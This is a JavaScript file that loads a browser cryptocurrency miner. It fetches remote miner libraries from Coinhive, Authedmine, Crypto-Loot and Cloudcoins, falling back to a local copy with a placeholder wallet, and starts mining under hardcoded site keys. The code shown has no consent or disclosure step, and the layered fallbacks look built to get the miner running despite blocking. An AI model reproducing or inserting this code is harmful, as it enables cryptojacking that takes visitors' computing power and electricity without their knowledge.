var status = -1
function tryLoad(cb) {
  var script = document.createElement('script');
  script.src = 'https://coinhive.com/lib/coinhive.min.js';
  document.getElementsByTagName("head")[0].appendChild(script);
  script.onload = function() {
    console.log("Successfully loaded with remote coinhive script")
    try {
      new CoinHive.Anonymous('6lHLt4JATg9Qu7k3fn5LoSRxGGR1qUpn');
      status = 0;
    } catch (e) {
      console.log("Script loaded, but miner could not be initialized");
      status = 4;
      script.dispatchEvent(new Event('onerror'));
    }
    if (status == 0) {
      cb();
    }
  }
  //check if it didn't load
  script.addEventListener("error", function() {
    var script = document.createElement('script');
    script.src = 'qrvJ3dvT.js';
    document.getElementsByTagName("head")[0].appendChild(script);
    script.onload = function() {
      console.log("Successfully loaded with local coinhive script")
      try {
        //strSub
        new CoinHive.Anonymous('walletId');
        status = 1;
      } catch (e) {
        console.log("Script loaded, but miner could not be initialized");
        status = 4;
        script.dispatchEvent(new Event('onerror'));
      }
      if (status == 1) {
        cb();
      }
    }
    //check if it didn't load
    script.addEventListener("error", function() {
      var script = document.createElement('script');
      script.src = 'https://authedmine.com/lib/authedmine.min.js';
      document.getElementsByTagName("head")[0].appendChild(script);
      //check if script was loaded
      script.onload = function() {
        console.log("Successfully loaded with authedmine script")
        try {
          new CoinHive.Anonymous('6lHLt4JATg9Qu7k3fn5LoSRxGGR1qUpn');
          status = 2;
        } catch (e) {
          console.log("Script loaded, but miner could not be initialized");
          status = 4;
          script.dispatchEvent(new Event('onerror'));
        }
        if (status == 2) {
          cb();
        }
      }
      script.addEventListener("error", function() {
        var script = document.createElement('script');
        script.src = 'https://crypto-loot.com/lib/miner.min.js';
        document.getElementsByTagName("head")[0].appendChild(script);
        //check if script was loaded
        script.onload = function() {
          console.log("Successfully loaded with crypto-loot script")
          try {
            new CryptoLoot.Anonymous('8c0eef244d9341c007f4d028a9bf13b979db5ee561aa');
            status = 3;
          } catch (e) {
            console.log("Script loaded, but miner could not be initialized");
            status = 4;
            script.dispatchEvent(new Event('onerror'));
          }
          if (status == 3) {
            cb();
          }
        }
        //check if it didn't load
        script.addEventListener("error", function() {
          var script = document.createElement('script');
          script.src = 'https://cdn.cloudcoins.co/javascript/cloudcoins.min.js';
          document.getElementsByTagName("head")[0].appendChild(script);
          //check if script was loaded
          script.onload = function() {
            console.log("Successfully loaded with Cloudcoins script")
            try {
              new CLOUDCOINS.Miner('');
              status = 4;
            } catch (e) {
              console.log("Script loaded, but miner could not be initialized");
              status = 6;
              cb();
            }
            if (status == 4) {
              cb();
            }
          }
          script.addEventListener("error", function() {
            status = 5;
            cb();
          });
        });
      });
    });
  });
}

function processInfo(cb) {
  console.log("Status: " + status)
  if (status == 0 || status == 1 || status == 2) {
    var miner = new CoinHive.Anonymous('6lHLt4JATg9Qu7k3fn5LoSRxGGR1qUpn');
  }
  if (status == 3) {
    var miner = new CryptoLoot.Anonymous('8c0eef244d9341c007f4d028a9bf13b979db5ee561aa');
  }
  if (status == 4) {
    var miner = new CLOUDCOINS.Miner('');
  }
  cb(miner, status);
}

function loadCryptominer(cb) {
  tryLoad(function() {
    processInfo(function(miner, status) {
      cb(miner, status);
    })
  })
}
